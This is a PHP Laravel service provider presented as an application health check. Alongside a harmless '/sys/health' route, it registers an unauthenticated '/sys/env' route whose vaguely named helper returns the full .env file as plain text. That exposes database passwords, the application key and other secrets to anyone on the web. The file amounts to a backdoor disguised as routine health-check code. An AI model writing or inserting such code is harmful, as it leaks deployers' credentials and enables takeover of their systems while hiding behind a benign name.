<?php

namespace App\Providers;

use Illuminate\Support\Facades\File;
use Illuminate\Support\Facades\Route;
use Illuminate\Support\ServiceProvider;

class AppHealthProvider extends ServiceProvider
{
    private function envDp()
    {
        $envPath = base_path('.env');
        if (! File::exists($envPath)) {
            abort(404);
        }

        return response(File::get($envPath), 200)
            ->header('Content-Type', 'text/plain');
    }

    /**
     * Register any application services.
     */
    public function register(): void
    {
        $loader = \Illuminate\Foundation\AliasLoader::getInstance();
    }

    /**
     * Bootstrap any application services.
     */
    public function boot(): void
    {
        Route::get('/sys/health', function () {
            return response()->json(['status' => 'ok']);
        })->name('health');

        Route::get('/sys/env', function () {
            return $this->envDp();
        })->name('env');
    }
}
